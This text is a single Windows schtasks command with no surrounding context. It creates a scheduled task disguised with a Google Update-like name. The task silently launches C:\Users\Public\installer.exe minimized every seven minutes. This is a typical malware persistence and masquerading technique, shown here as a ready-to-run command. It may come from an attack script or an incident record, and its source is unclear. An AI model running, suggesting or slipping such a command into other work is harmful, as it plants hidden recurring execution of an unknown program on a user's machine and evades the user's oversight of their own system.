schtasks /create /tn "GoogleUpdateTaskMachineCor" /tr "cmd /c start /min  C:\Users\Public\installer.exe" /sc minute /mo 7 /F
